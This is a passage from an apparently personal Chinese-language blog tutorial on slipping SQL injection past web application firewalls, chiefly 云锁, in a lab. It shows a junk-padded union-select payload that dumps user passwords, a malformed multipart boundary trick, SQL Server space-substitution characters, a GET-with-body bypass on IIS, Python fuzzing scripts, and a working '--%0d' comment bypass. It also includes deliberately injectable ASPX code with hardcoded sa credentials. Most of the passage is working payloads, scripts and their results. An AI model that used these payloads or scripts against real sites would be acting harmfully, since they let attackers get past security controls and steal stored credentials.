class="number">5</span>g<span class="number">4</span>U<span class="number">8</span>RqGIPgENihdFdmLg<span class="number">1</span>SnyGwbHz<span class="number">6</span>vTzAYz<span class="number">9</span>URVuGG<span class="number">0</span>PTColqM<span class="number">42</span>i<span class="number">2</span>q<span class="number">79</span>F<span class="number">0</span>ogzEf<span class="number">6302</span>gGCgsGgpTNccn<span class="number">84</span>mz<span class="number">8</span>mHE<span class="number">5</span>zgcgxvVDnVicaGus<span class="number">5</span>kXqqC<span class="number">4</span>mCqHWBl<span class="number">8</span>DtOBeAAQOuGx<span class="number">6</span>gnCuTmDrS<span class="number">2</span>MeIUgbgdmLucROGN<span class="number">38</span>Hn<span class="number">6</span>cCNnPu<span class="number">0</span>n<span class="number">9</span>KRanIGa<span class="number">8</span>DDbTV<span class="number">2</span>gQ<span class="number">7</span>KvWF<span class="number">5</span>Suzn<span class="number">7</span>MRsdYXSgGypgTnWb<span class="number">9</span>vZa<span class="number">35</span>zPS<span class="number">6</span>sBU<span class="number">0</span>uaHYvI<span class="number">2</span>rLNf<span class="number">3</span>AFAX<span class="number">5</span>EU<span class="number">8</span>gUNffy<span class="number">0</span>X<span class="number">6</span>H<span class="number">8</span>LoRiNURY<span class="number">08</span>eL<span class="number">6</span>rd<span class="number">8</span>mgHG<span class="number">4</span>ifXWda<span class="number">8</span>AB<span class="number">9</span>XGhHYNaazBg<span class="number">1</span>gEM<span class="number">8</span>DgoBzYqLK<span class="number">99</span>l<span class="number">2</span>ggCKs<span class="number">1</span>gSrIGeiAZLT<span class="number">0</span>L<span class="number">1</span>A<span class="number">9</span>ZBrK<span class="number">6</span>HMAddFahmSfiDKaEpq<span class="number">7</span>EHZEw<span class="number">86</span>fBIfKSmUFmswNbm<span class="number">9</span>VbRZmTfrhXhY<span class="number">9</span>E<span class="number">5</span>eK<span class="number">5</span>olCNqNekIqxngpHEsoGHWGptezZuVdC<span class="number">833</span>tC<span class="number">4</span>ufSiAeUqZPIeCFelBsLHIsPAdUw<span class="number">1</span>FtxOU<span class="number">7</span>T<span class="number">3</span>RiHodZ<span class="number">7</span>XT<span class="number">7</span>GdAxZgdc<span class="number">5</span>bozzlNcvq<span class="number">9</span>DFevaRHFOD<span class="number">5</span>fGwy<span class="number">7</span>GXXDOKKGQb<span class="number">7</span>DvPOb<span class="number">7</span>g<span class="number">86</span>nQAzaMKqFBbANH<span class="number">7</span>ymLqUFdAcEUlWcFmIkPXuVw<span class="number">1</span>z<span class="number">7</span>Qw<span class="number">8</span>M<span class="number">6</span>CFh<span class="number">6</span>MWspPTRBICxH<span class="number">4</span>shQuhpA<span class="number">38</span>BFGDmHk<span class="number">7</span>MO<span class="number">7</span>qurMzxH<span class="number">54</span>bkZQlE<span class="number">6</span>OEzoyCcvFhFcAQQbtIVIggsOCdcg<span class="number">1</span>quFtqdZBrI<span class="number">78</span>SvqywXUqRdcSfgYHnXMgOcOVFX<span class="number">0</span>ISvrzyZCTErFIBN<span class="number">5</span>NhgShMucFTsZhyfPNYyH<span class="number">4</span>oCbzqLuqOsslgF<span class="number">22</span>nQG<span class="number">0</span>Mk<span class="number">9</span>a<span class="number">7</span>AC<span class="number">3</span>Zpecu<span class="number">3</span>H<span class="number">96</span>glXc<span class="number">5</span>OKopgcG<span class="number">8</span>rFdPniriYOtQkN<span class="number">99</span>ZPLzG<span class="number">2</span>eWFPrQC<span class="number">2</span>nsXfuYIN<span class="number">3</span>PuuCkHYoIQSy<span class="number">0</span>c<span class="number">0</span>qTvxK<span class="number">0</span>bETtke<span class="number">2</span>xNuXdKzqLG<span class="number">7</span>PgzXwvYvVA<span class="number">7</span>AyQlNB<span class="number">4</span>Q<span class="number">8</span>k<span class="number">0</span>utBbV<span class="number">7</span>RBv<span class="number">0</span>LnulhpG<span class="number">7</span>cG<span class="number">3</span>BAWA<span class="number">9</span>FS<span class="number">2</span>Xk<span class="number">8</span>FWxuHiBEcuKlLn<span class="number">8</span>UqBDmxDiHPVQFuBGHTPYnw<span class="number">1</span>ZIokGQNfkTymcK<span class="number">2</span>nQCuERFDp<span class="number">2</span>Y<span class="number">2647</span>ey<span class="number">9</span>Qx<span class="number">7</span>Tfwm<span class="number">7</span>ybqv<span class="number">8</span>FqSzB<span class="number">7</span>CnkVAMgs<span class="number">5</span>rbyqVXSzggxPn<span class="number">56</span>i<span class="number">1</span>HWzbcK<span class="number">03</span>amCFfHmm<span class="number">4</span>kLCOpCzgSGN<span class="number">7</span>dRT<span class="number">8</span>GxeSSpOtL<span class="number">731</span>Qb<span class="number">0</span>Ep<span class="number">0</span>bVvYevtqgUaY<span class="number">2</span>SoYNqE<span class="number">3</span>A<span class="number">6</span>OWD<span class="number">4</span>cOIDI<span class="number">69</span>LkvGDsiArXcY<span class="number">7</span>unU<span class="number">3</span>yRDsGWrsMRCKKf<span class="number">3</span>yc<span class="number">5</span>HKkGrYLnASDGFgFbxzkuSkmF<span class="number">7</span>H<span class="number">2</span>gdK<span class="number">72</span>CaGCFoLRkAQg<span class="number">7</span>MGAGTRgQbpzcXBKzzx<span class="number">3</span>P<span class="number">0</span>kXg<span class="number">2</span>fu<span class="number">563</span>qvk<span class="number">2</span>t<span class="number">9</span>R<span class="number">8</span>Lnx<span class="number">3</span>Yfwr<span class="number">0</span>UuQGH<span class="number">3</span>LYCbbxkORbD<span class="number">4</span>pmXtCignqfRkA<span class="number">601</span>mFsN<span class="number">7</span>XVUdZyC<span class="number">7</span>Gn<span class="number">4</span>sm<span class="number">3</span>p<span class="number">6</span>okyPQuV<span class="number">503</span>loB<span class="number">7</span>fgBGlZyvEiBms<span class="number">0</span>HTeGPTsu<span class="number">0</span>yR<span class="number">6</span>GkthNNOgn<span class="number">6</span>KzkGEBLpFi<span class="number">9</span>vXuOhl<span class="number">8</span>eOF<span class="number">1</span>pnGrWEUxvPolvg<span class="number">3</span>iYKUWh<span class="number">8</span>KLxsaQ<span class="number">7</span>mgtgdlmIONhDFhp<span class="number">4</span>EDAkHwE<span class="number">1</span>nAHoGxE<span class="number">0</span>A<span class="number">4</span>R<span class="number">4</span>VhOFMZHTi<span class="number">91</span>ovtArLs<span class="number">5</span>FkgMGZyP<span class="number">6</span>Gmmtv<span class="number">6</span>vndIiBHrga<span class="number">7</span>nntOMF<span class="number">6</span>pCbxBZedkRb<span class="number">5</span>vGOSXCtZqKHsl<span class="number">8</span>SYg<span class="number">1</span>xVQogewZ<span class="number">7</span>BhtgRv<span class="number">176</span>ICvIH<span class="number">3</span>sXOyKNs<span class="number">3</span>Si<span class="number">8</span>qsQtqBhPdIkbvgG<span class="number">6</span>WOQCEM<span class="number">9</span>QtwmaMmU<span class="number">8</span>VE<span class="number">0</span>STYTqXk<span class="number">41</span>OTcrumENwAiE<span class="number">5</span>ohC<span class="number">5</span>V<span class="number">8</span>VCmBKB<span class="number">78</span>Gd<span class="number">2</span>gb<span class="number">2</span>aMKpQCvZdQXN<span class="number">2</span>SWE<span class="number">9</span>bvXBCKnBNnOVGnLklFlfoaRaCZmB<span class="number">2</span>Ad<span class="number">6</span>YelvORH<span class="number">6</span>HE<span class="number">85</span>ZsV<span class="number">3</span>zASa<span class="number">89</span>p<span class="number">3</span>pCmOpKavBtKIZeCn<span class="number">3</span>KuVyapYkC<span class="number">3</span>D<span class="number">5</span>g<span class="number">6</span>eR<span class="number">1</span>UGH<span class="number">5</span>r<span class="number">8</span>m<span class="number">7</span>p<span class="number">6</span>hutN<span class="number">3</span>TWapb<span class="number">6</span>AS<span class="number">4</span>TgvyM<span class="number">42</span>Qf<span class="number">7</span>KlWqgn<span class="number">4</span>dKGYMiZUBchheWvfgcCPvhqBrEYKmfcx<span class="number">1</span>yXqKKGEGrNaE<span class="number">60</span>GGeFuKr<span class="number">5</span>zSga<span class="number">3</span>XEoKy<span class="number">62</span>WNze<span class="number">0</span>agIQVIyplW<span class="number">92</span>c<span class="number">3</span>MG<span class="number">7</span>eAkNWVT<span class="number">5</span>ZLngmamE<span class="number">9</span>Nz<span class="number">79</span>gv<span class="number">5</span>gaAi<span class="number">8</span>SZ<span class="number">8</span>HAW<span class="number">2</span>FuLqRwayXbomGGTBgnw<span class="number">2</span>zPPYG<span class="number">3</span>G<span class="number">113</span>g<span class="number">1</span>swFZsWwHW<span class="number">1</span>gZDq<span class="number">3</span>ndRUFfyXsP<span class="number">7</span>oozHcw<span class="number">2</span>Qyx<span class="number">6</span>csGBLwVincGYehwGf<span class="number">7</span>MxoMFx<span class="number">9</span>tMfIsFkW<span class="number">8</span>PVKfsArgTiM<span class="number">4</span>ygLBLkdUYGPznfSMK<span class="number">0</span>pXI<span class="number">9</span>NH<span class="number">7</span>Pn<span class="number">1</span>NOyHUZ<span class="number">2</span>nkfN<span class="number">4</span>gmDgmfH<span class="number">1</span>t<span class="number">6</span>XorLEgD<span class="number">7</span>UfwPxwD<span class="number">085</span>UiHXwgMmURe<span class="number">6</span>Ni<span class="number">7</span>aHrZM<span class="number">0</span>RY<span class="number">6</span>qr<span class="number">0</span>wsUybul<span class="number">5</span>SXoL<span class="number">9</span>wgRqdxva<span class="number">3</span>iWVUnzRaWtdOeGf<span class="number">1</span>QwSbTbsUA<span class="number">2</span>rT<span class="number">6</span>gOkSLahn<span class="number">7</span>wRq<span class="number">8</span>P<span class="number">3</span>GlHAIQemnmir<span class="number">0</span>fQSBFI<span class="number">95</span>LrGzCrVlLFg<span class="number">2</span>mNKod<span class="number">138</span>ZgHYalEFTHUD<span class="number">82</span>gUdGxe<span class="number">2</span>G<span class="number">7</span>EvgUty<span class="number">4</span>f<span class="number">2</span>GRx<span class="number">5</span>o<span class="number">1</span>fWH<span class="number">3</span>fu<span class="number">5</span>XAeeyGgsglwQNLxLriCl<span class="number">16</span>VtbNfvEYCIQ<span class="number">9</span>wU<span class="number">5</span>hkPXsPu<span class="number">0</span>v<span class="number">4</span>XrNGQYziwxWWsdI<span class="number">4</span>S<span class="number">3</span>LvcyKHCYiHzokFWo<span class="number">9</span>CchA<span class="number">5</span>Lv<span class="number">8</span>WI<span class="number">2</span>hoEUse<span class="number">7</span>u<span class="number">9</span>zNgxkGKy<span class="number">892</span>ffaOCh<span class="number">21</span>k<span class="number">2</span>Oar<span class="number">7</span>h<span class="number">7</span>H<span class="number">4</span>g<span class="number">7</span>WvtNXvqr<span class="number">0</span>NDEHByaE<span class="number">0</span>Rgc<span class="number">8</span>tnQ<span class="number">8</span>DMhwxMf<span class="number">0</span>modweAA<span class="number">2</span>lazGYhRTPWvGDl<span class="number">73</span>wcpnqSigKmU<span class="number">4</span>GDTrKm<span class="number">4</span>VLFvulmC<span class="number">1</span>BgKe<span class="number">57</span>bwPGrkcW<span class="number">1</span>wcaPGiebyKOZlLzAWFRbSQPzgN<span class="number">0</span>PbxUer<span class="number">43</span>HLynpetrkgWgtg<span class="number">6</span>g<span class="number">60</span>b<span class="number">8</span>hIcRNzaOTd<span class="number">9</span>UGuOUiXrqyXq<span class="number">85</span>HOQZK<span class="number">0</span>txlwEirbh<span class="number">4</span>rW<span class="number">6</span>mXXgDfeypuMLaPoeHaaqh*/null,concat_ws(char(<span class="number">32</span>,<span class="number">58</span>,<span class="number">32</span>),user,password) from users%<span class="number">23</span>#</span></span><br></pre></td></tr></table></figure>
<p>​    可以看到SQL注入成功<img src="https://i.loli.net/2021/10/21/jtQCkwA7hoLJ3F1.png" alt="image-20211021205419874"></p>
<blockquote>
<p>注：如果想要查询函数，如database()，需要在database与括号之间插入注释符与脏数据，database/*脏数据*/()</p>
</blockquote>
<h3 id="畸形的boundary绕过"><a href="#畸形的boundary绕过" class="headerlink" title="畸形的boundary绕过"></a>畸形的boundary绕过</h3><h4 id="绕过原理-1"><a href="#绕过原理-1" class="headerlink" title="绕过原理"></a>绕过原理</h4><p><strong>HTTP协议兼容性：HTTP Body的多样性</strong></p>
<p><strong>规则缺陷/特性：WAF对boundary识别的局限性</strong></p>
<p>PHP在解析multipart data的时候有自己的特性，对于boundary的识别，只取了逗号前面的内容，例如我们设置的boundary为——aaaa,123456，php解析的时候只识别了——aaaa，后面的内容均没有识别。然而WAF在做解析的时候，有可能获取的是整个字符串，此时可能就会出现绕过。</p>
<h4 id="实验步骤-1"><a href="#实验步骤-1" class="headerlink" title="实验步骤"></a>实验步骤</h4><p>首先使用BurpSuite进行抓包，并发送到Repeater</p>
<p><img src="https://i.loli.net/2021/10/23/S5cPLIBAG6Owa1H.png" alt="image-20211023164914571"></p>
<p>点击右键，选择修改请求方法，将GET请求转换为POST请求</p>
<p><img src="/post/Users/blood/AppData/Roaming/Typora/typora-user-images/image-20211023165002170.png" alt="image-20211023165002170"></p>
<p>再点击右键，选择修改body编码，将内容提交协议更改为multipart/form-data</p>
<p><img src="https://i.loli.net/2021/10/23/sxJZbIiBE76tMzQ.png" alt="image-20211023165138569"></p>
<p>先使用联合查询测试是否会被WAF拦截</p>
<p><img src="https://i.loli.net/2021/10/23/nvCJmZY2MOajEDH.png" alt="image-20211023165633593"></p>
<p>果然被拦截了，说明WAF的规则是覆盖到multipart/form-data协议的</p>
<p>我们修改下boundary的值，再发送数据包</p>
<p><img src="https://i.loli.net/2021/10/23/v4QafgqoyXBulzF.png" alt="image-20211023171737548"></p>
<p>WAF并未拦截，成功利用该方法绕过</p>
<p><img src="https://i.loli.net/2021/10/23/dCiS8yzGm6qMB5Z.png" alt="image-20211023165834336"></p>
<h2 id="Bypass云锁SQLServer注入"><a href="#Bypass云锁SQLServer注入" class="headerlink" title="Bypass云锁SQLServer注入"></a>Bypass云锁SQLServer注入</h2><h3 id="SQLServer特性"><a href="#SQLServer特性" class="headerlink" title="SQLServer特性"></a>SQLServer特性</h3><p><strong>空格可以由其它字符替代</strong></p>
<blockquote>
<p>select id,contents,time from news where news_id=1<span style="color:red">①</span>union<span style="color:red">②</span>select<span style="color:red">③</span>1,2,db_name()<span style="color:red">④</span>from<span style="color:red">⑤</span>admin</p>
</blockquote>
<ul>
<li>位置①<ul>
<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
<li>可以利用注释符号：/**/、—+a%0d%0a</li>
<li>可利用数学运算符以及数据类型：news_id=1.0，news_id=1e0，news_id=1-1</li>
</ul>
</li>
<li>位置②<ul>
<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
<li>可以利用注释符号：/**/、—+a%0d%0a</li>
<li>可以利用加号+替换空格：union+select</li>
</ul>
</li>
<li>位置③<ul>
<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
<li>可以利用注释符号：/**/、—+a%0d%0a</li>
<li>可利用数学运算符：+、-、~、.    （注：其中-、~、.号必须是select查询的第一个字段的数据类型为数字型才能使用）</li>
<li>可以利用小括号()替换空格：select(1),2,db_name()</li>
</ul>
</li>
<li>位置④<ul>
<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
<li>可以利用注释符号：/**/、—+a%0d%0a</li>
<li>可利用其他字符：%80~%FF（需要IIS服务器支持）</li>
</ul>
</li>
<li>位置⑤<ul>
<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
<li>可以利用注释符号：/**/、—+a%0d%0a</li>
<li>可利用其他字符：%80~%FF（需要IIS服务器支持）</li>
<li>可以利用点号.替换空格：from.users</li>
<li>可以利用中括号[]替换空格：from[users]</li>
</ul>
</li>
</ul>
<h3 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h3><p>数据库：SQL Server 2008R2</p>
<p>Web服务器： IIS7.5 CN</p>
<p>WAF：云锁-win_3.1.20.24</p>
<p>靶场源码如下：index.aspx</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;C#&quot; AutoEventWireup=&quot;true&quot; %&gt;</span><br><span class="line">&lt;%@ Import Namespace=&quot;System.Data&quot; %&gt;</span><br><span class="line">&lt;%@ Import namespace=&quot;System.Data.SqlClient&quot;  %&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;script runat=&quot;server&quot;&gt;</span><br><span class="line">    private DataSet resSet=new DataSet();</span><br><span class="line">    protected void Page_Load(object sender, EventArgs e)</span><br><span class="line">    &#123;</span><br><span class="line">        String strconn = &quot;server=.;database=test;uid=sa;pwd=admin&quot;;</span><br><span class="line">		string id = Request.Params[&quot;id&quot;];</span><br><span class="line">        string sql = string.Format(&quot;select * from newss where id=&#123;0&#125;&quot;, id);</span><br><span class="line">        SqlConnection connection=new SqlConnection(strconn);</span><br><span class="line">        connection.Open();</span><br><span class="line">        SqlDataAdapter dataAdapter = new SqlDataAdapter(sql, connection);</span><br><span class="line">        dataAdapter.Fill(resSet);</span><br><span class="line">        DgData.DataSource = resSet.Tables[0];</span><br><span class="line">        DgData.DataBind();</span><br><span class="line">        Response.Write(&quot;执行语句:&lt;br&gt;&quot;+sql);</span><br><span class="line">        Response.Write(&quot;&lt;br&gt;结果为:&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head runat=&quot;server&quot;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;</span><br><span class="line">    &lt;title&gt;SQLServer注入测试&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form id=&quot;form1&quot; runat=&quot;server&quot;&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">    </span><br><span class="line">        &lt;asp:DataGrid ID=&quot;DgData&quot; runat=&quot;server&quot; BackColor=&quot;White&quot; BorderColor=&quot;#3366CC&quot; </span><br><span class="line">            BorderStyle=&quot;None&quot; BorderWidth=&quot;1px&quot; CellPadding=&quot;4&quot; </span><br><span class="line">                HeaderStyle-CssClass=&quot;head&quot; Width=&quot;203px&quot;&gt;</span><br><span class="line">            &lt;FooterStyle BackColor=&quot;#99CCCC&quot; ForeColor=&quot;#003399&quot; /&gt;</span><br><span class="line">            &lt;SelectedItemStyle BackColor=&quot;#009999&quot; Font-Bold=&quot;True&quot; ForeColor=&quot;#CCFF99&quot; /&gt;</span><br><span class="line">            &lt;PagerStyle BackColor=&quot;#99CCCC&quot; ForeColor=&quot;#003399&quot; HorizontalAlign=&quot;Left&quot; </span><br><span class="line">                Mode=&quot;NumericPages&quot; /&gt;</span><br><span class="line">            &lt;ItemStyle BackColor=&quot;White&quot; ForeColor=&quot;#003399&quot; /&gt;</span><br><span class="line">&lt;HeaderStyle CssClass=&quot;head&quot; BackColor=&quot;#003399&quot; Font-Bold=&quot;True&quot; ForeColor=&quot;#CCCCFF&quot;&gt;&lt;/HeaderStyle&gt;</span><br><span class="line">        &lt;/asp:DataGrid&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<h3 id="GET方法传输POST数据绕过"><a href="#GET方法传输POST数据绕过" class="headerlink" title="GET方法传输POST数据绕过"></a>GET方法传输POST数据绕过</h3><h4 id="绕过原理-2"><a href="#绕过原理-2" class="headerlink" title="绕过原理"></a>绕过原理</h4><p><strong>HTTP协议兼容性：HTTP Method的多样性</strong></p>
<p><strong>规则缺陷/特性：IIS中的GET请求可以传输POST数据</strong></p>
<p>大家的常识是GET参数通过URL传递，POST放在Request body中。</p>
<p>但是在某些中间件（如IIS）中的GET请求同样可以传输POST数据。</p>
<h4 id="实验步骤-2"><a href="#实验步骤-2" class="headerlink" title="实验步骤"></a>实验步骤</h4><p>首先使用POST方法发送数据，并使用BurpSuite抓取数据包</p>
<p><img src="https://i.loli.net/2021/10/22/JY9L2RvN6O7ZMdG.png" alt="image-20211022221419839"></p>
<p>将POST请求方法改为GET请求方法，发现仍然是可以发送数据的</p>
<p><img src="https://i.loli.net/2021/10/22/JRd5yg8vsSj1Azu.png" alt="image-20211022221514871"></p>
<p>在请求体中构造我们的payload，可以绕过云锁WAF实现SQL注入</p>
<p><img src="https://i.loli.net/2021/10/22/o7cXy5Gp4bf1Sh6.png" alt="image-20211022221931366"></p>
<blockquote>
<p>注：使用IIS服务器部署的Web应用也可以用该方法去绕过云锁</p>
</blockquote>
<h3 id="多行注释符替代空格绕过【未成功】"><a href="#多行注释符替代空格绕过【未成功】" class="headerlink" title="多行注释符替代空格绕过【未成功】"></a>多行注释符替代空格绕过【未成功】</h3><h4 id="绕过原理-3"><a href="#绕过原理-3" class="headerlink" title="绕过原理"></a>绕过原理</h4><p><strong>规则缺陷/特性：数据库空格可使用其它字符替代</strong></p>
<p>在进行SQL语句查询的时候可以利用注释符来替代语法中的空格，例如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [dbo].[<span class="keyword">User</span>] <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>可替代为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>[dbo].[<span class="keyword">User</span>]<span class="comment">/**/</span><span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>那么意味着在注释符中可以添加大量的无效字符来打破WAF的规则匹配。</p>
<h4 id="实验步骤-3"><a href="#实验步骤-3" class="headerlink" title="实验步骤"></a>实验步骤</h4><p>首先使用BurpSuite抓取数据包，并记下数据包的Header信息</p>
<p><img src="https://i.loli.net/2021/10/22/sIvZhxymSwaWnbV.png" alt="image-20211022213840616"></p>
<p>编写好我们的Python脚本进行FUZZ：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0&#x27;</span>&#125;</span><br><span class="line">url=<span class="string">&quot;http://hackrock.com:8205/index.aspx&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_random_str1</span>(<span class="params">randomlength=<span class="number">4</span></span>):</span></span><br><span class="line">	random_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	base_str = <span class="string">&#x27;!@$%^&amp;*()_+=-&#x27;</span></span><br><span class="line">	length = <span class="built_in">len</span>(base_str) - <span class="number">1</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(randomlength):</span><br><span class="line">		random_str += base_str[random.randint(<span class="number">0</span>, length)]</span><br><span class="line">	<span class="keyword">return</span> random_str</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_random_str2</span>(<span class="params">randomlength=<span class="number">10</span></span>):</span></span><br><span class="line">	random_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	base_str = <span class="string">&#x27;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">	length = <span class="built_in">len</span>(base_str) - <span class="number">1</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(randomlength):</span><br><span class="line">		random_str += base_str[random.randint(<span class="number">0</span>, length)]</span><br><span class="line">	<span class="keyword">return</span> random_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">600</span>):</span><br><span class="line">	random_str = generate_random_str1() + generate_random_str2()</span><br><span class="line">	payload = &#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">&quot;1 union/*&quot;</span>+random_str+<span class="string">&quot;*/select 1,&#x27;2&#x27;,&#x27;3&#x27;&quot;</span>&#125;</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		time.sleep(<span class="number">0.5</span>)</span><br><span class="line">		response = requests.post(url=url, headers=headers, data=payload, timeout=<span class="number">0.5</span>)</span><br><span class="line">		<span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">			<span class="built_in">print</span>(payload)</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>这个脚本使用的是python3编写，生成以特殊符号开头的无效字符，使用POST方法进行FUZZ</p>
<p>执行脚本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 fuzz_2.py</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/23/hpkiHP3vbAVdQDj.png" alt="image-20211023002336998"></p>
<p>这里发现一个规律：注释符/**/中的无效字符都是以<code>!</code>开头，形如MySQL中的内联注释符。这可能是云锁在数据清洗时未对这两个数据库做严格区分，造成绕过</p>
<p>选择一个payload进行测试</p>
<p><img src="https://i.loli.net/2021/10/23/p8WrhDRPEtv4HUs.png" alt="image-20211023002820957"></p>
<p>但是在查询关键函数的时候仍会被拦截</p>
<p><img src="https://i.loli.net/2021/10/23/P6oS3XOeBHIF1Qk.png" alt="image-20211023002954874"></p>
<p>这时候不用慌，可以采用特殊符号插入函数名与括号之间，或直接插入空格即可</p>
<p><img src="https://i.loli.net/2021/10/23/32gwNE8LhAGomty.png" alt="image-20211023003111697"></p>
<p>然而，在构造payload进行爆账号密码时，却被拦截</p>
<p><img src="https://i.loli.net/2021/10/23/kGczlIQJ42RxmPf.png" alt="image-20211023011844590"></p>
<p>查看后台告警信息</p>
<p><img src="https://i.loli.net/2021/10/23/79X6z4OrfJpbhAg.png" alt="image-20211023011948717"></p>
<p>云锁会自动将注释符转换为空格，从而判断是否存在违规操作。</p>
<p>在尝试多次后，这种方法终究不能完美绕过云锁。但在测试的过程中却意外发现了另外一种简单的云锁绕过方式。</p>
<h3 id="注释符与回车符结合绕过"><a href="#注释符与回车符结合绕过" class="headerlink" title="注释符与回车符结合绕过"></a>注释符与回车符结合绕过</h3><h4 id="绕过原理-4"><a href="#绕过原理-4" class="headerlink" title="绕过原理"></a>绕过原理</h4><p><strong>规则缺陷/特性：数据库空格可使用其它字符替代</strong></p>
<p>在尝试使用多行注释符替换空格的过程中，意外地发现了一个绕过方法：</p>
<p>可以利用注释符与回车符结合来替代语法中的空格：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1--%0dunion select 1,&#x27;2&#x27;,&#x27;3&#x27;</span><br></pre></td></tr></table></figure>
<p>这是MSSQL中的一个特性，—注释符可以与直接%0d结合，使—注释符无法生效</p>
<p><img src="/post/Users/blood/AppData/Roaming/Typora/typora-user-images/image-20211023125921816.png" alt="image-20211023125921816"></p>
<p>这可能是云锁在过滤中的疏忽导致的绕过</p>
<h4 id="实验步骤-4"><a href="#实验步骤-4" class="headerlink" title="实验步骤"></a>实验步骤</h4><p>如果想要知道除了%0d还有哪些字符可以绕过云锁，可以编写一个简单的python脚本进行FUZZ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0&#x27;</span>&#125;</span><br><span class="line">base_url = <span class="string">&quot;http://hackrock.com:8205/index.aspx&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_str</span>():</span></span><br><span class="line">	url_str = []</span><br><span class="line">	base_str = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> base_str:</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> base_str:</span><br><span class="line">			url_str.append(<span class="string">&#x27;%&#x27;</span>+i+j)</span><br><span class="line">	<span class="keyword">return</span> url_str</span><br><span class="line"></span><br><span class="line">url_str = generate_str()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> url_str:</span><br><span class="line">	url = base_url + <span class="string">&quot;?id=-1--&quot;</span> + i + <span class="string">&quot;union select 1,&#x27;2&#x27;,&#x27;3&#x27;&quot;</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		time.sleep(<span class="number">1</span>)</span><br><span class="line">		response = requests.get(url, headers=headers, timeout=<span class="number">0.5</span>)</span><br><span class="line">		len_text = <span class="built_in">len</span>(response.text)</span><br><span class="line">		<span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">			<span class="built_in">print</span>(url)</span><br><span class="line">			<span class="built_in">print</span>(len_text)</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>可以根据返回的请求体长度判断有哪些字符可以绕过WAF，当然也可以使用BurpSuite进行FUZZ</p>
<p>但测试下来只有%0d可以绕过，且能正常爆出数据</p>
